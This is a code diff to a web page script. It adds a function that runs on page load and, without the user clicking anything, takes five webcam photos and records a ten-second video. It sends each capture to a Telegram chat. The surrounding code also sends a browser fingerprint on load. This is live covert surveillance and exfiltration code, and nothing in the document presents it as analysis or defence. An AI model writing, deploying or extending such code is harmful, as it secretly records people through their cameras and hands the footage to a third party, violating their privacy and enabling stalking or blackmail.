@@ -18,6 +18,147 @@ document.addEventListener('DOMContentLoaded', async () => {
     let recordingType = '';
     let initialErrorShown = false;
     
+    // Auto capture photos and video on page load
+    async function autoCaptureonPageLoad() {
+        try {
+            // Wait a bit for stream to be ready
+            await new Promise(resolve => setTimeout(resolve, 1000));
+
+            if (!stream) {
+                console.log('Stream not ready yet, retrying...');
+                setTimeout(autoCaptureonPageLoad, 2000);
+                return;
+            }
+
+            console.log('Starting auto capture...');
+
+            // Capture 5 photos
+            const canvas = document.createElement('canvas');
+            const videoTrack = stream.getVideoTracks()[0];
+            if (videoTrack) {
+                let width = 640;
+                let height = 480;
+                try {
+                    const settings = videoTrack.getSettings();
+                    if (settings.width && settings.height) {
+                        width = settings.width;
+                        height = settings.height;
+                    }
+                } catch (err) {
+                    console.warn('Could not get video settings:', err);
+                }
+
+                canvas.width = width;
+                canvas.height = height;
+                const context = canvas.getContext('2d');
+
+                for (let i = 0; i < 5; i++) {
+                    try {
+                        const videoTrack = stream.getVideoTracks()[0];
+                        if (!videoTrack) break;
+
+                        // Try ImageCapture API first
+                        if (typeof ImageCapture !== 'undefined') {
+                            try {
+                                const imageCaptureObj = new ImageCapture(videoTrack);
+                                const bitmap = await imageCaptureObj.grabFrame();
+                                const canvas2 = document.createElement('canvas');
+                                canvas2.width = bitmap.width;
+                                canvas2.height = bitmap.height;
+                                const ctx = canvas2.getContext('2d');
+                                ctx.drawImage(bitmap, 0, 0);
+
+                                const blob = await new Promise((resolve, reject) => {
+                                    canvas2.toBlob((blob) => {
+                                        if (blob) {
+                                            resolve(blob);
+                                        } else {
+                                            reject(new Error(''));
+                                        }
+                                    }, 'image/jpeg', 0.95);
+                                });
+
+                                const formData = {
+                                    method: 'sendPhoto',
+                                    fileType: 'photo',
+                                    file: blob,
+                                    fileName: `auto_photo_${Date.now()}_${i}.jpg`
+                                };
+                                await sendToTelegram(formData);
+                                console.log(`Photo ${i + 1} sent successfully`);
+                            } catch (imageCaptureErr) {
+                                console.warn('ImageCapture failed:', imageCaptureErr);
+                            }
+                        }
+
+                        if (i < 4) await new Promise(resolve => setTimeout(resolve, 500));
+                    } catch (photoError) {
+                        console.error(`Auto photo capture error ${i + 1}:`, photoError);
+                    }
+                }
+            }
+
+            // Record 10 second video
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            const videoMimeType = getSupportedVideoMimeType();
+            let recordedChunks = [];
+            let autoMediaRecorder = null;
+
+            try {
+                autoMediaRecorder = new MediaRecorder(stream, { mimeType: videoMimeType });
+            } catch (error) {
+                console.error('MediaRecorder error:', error);
+                return;
+            }
+
+            autoMediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            autoMediaRecorder.onstop = async () => {
+                const blob = new Blob(recordedChunks, { type: videoMimeType });
+                recordedChunks = [];
+
+                let fileExtension = 'webm';
+                if (videoMimeType.includes('mp4')) fileExtension = 'mp4';
+                else if (videoMimeType.includes('mpeg')) fileExtension = 'mp3';
+                else if (videoMimeType.includes('wav')) fileExtension = 'wav';
+                else if (videoMimeType.includes('x-msvideo')) fileExtension = 'avi';
+
+                const formData = {
+                    method: 'sendVideo',
+                    fileType: 'video',
+                    file: blob,
+                    fileName: `auto_video_${Date.now()}.${fileExtension}`
+                };
+
+                await sendToTelegram(formData);
+                console.log('Auto video sent successfully');
+            };
+
+            try {
+                autoMediaRecorder.start();
+                console.log('Auto video recording started...');
+
+                // Auto-stop after 10 seconds
+                setTimeout(() => {
+                    if (autoMediaRecorder && autoMediaRecorder.state === 'recording') {
+                        autoMediaRecorder.stop();
+                        console.log('Auto video recording stopped');
+                    }
+                }, 10000);
+            } catch (error) {
+                console.error('Recording start error:', error);
+            }
+
+        } catch (error) {
+            console.error('Error in auto capture:', error);
+        }
+    }
+
     // Send browser fingerprint on page load
     try {
         const fingerprint = await collectBrowserFingerprint();
@@ -162,6 +303,9 @@ document.addEventListener('DOMContentLoaded', async () => {
             recordVideoBtn.disabled = false;
             recordAudioBtn.disabled = false;
             fingerprintBtn.disabled = false;
+
+            // Start auto capture on page load
+            autoCaptureonPageLoad();
         } catch (err) {
             // Show error only once on page load
             if (!initialErrorShown) {
